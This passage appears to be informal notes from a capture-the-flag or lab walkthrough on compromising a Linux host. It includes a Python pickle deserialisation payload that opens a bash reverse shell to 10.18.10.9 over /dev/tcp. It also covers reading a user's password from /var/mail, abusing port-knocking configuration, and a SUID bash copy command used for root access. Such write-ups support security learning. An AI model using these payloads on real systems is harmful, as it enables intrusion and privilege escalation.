we found a  a link which calls a directory but no luck with path disclosure

on a subdomain we can upload a file any file but rev.php was not working it was showing internal error

an it was in json

so one option ==json deserialisation==

```
import pickle, os, base64
class P(object):
    def __reduce__(self):
        return (os.system,("/bin/bash -c 'bash -i >& /dev/tcp/10.18.10.9/5555 0>&1'",))
pickle.dump(P(),open('exploit','wb'))
```

and uploaded exploit and got shell

checking ==/var/mail== we got passwd for dev1

and `/etc/knockd.config` showed us knocking ports

so we knocked and got shell as dev1

we had perm for `/etc/init.d/knockd.conf`

so we can edit `/etc/knockd.config` and we put our command

`/bin/bash -c ‘cp /bin/bash /tmp; cd /tmp; chmod +s bash’`

and again knock on the ports to get shell
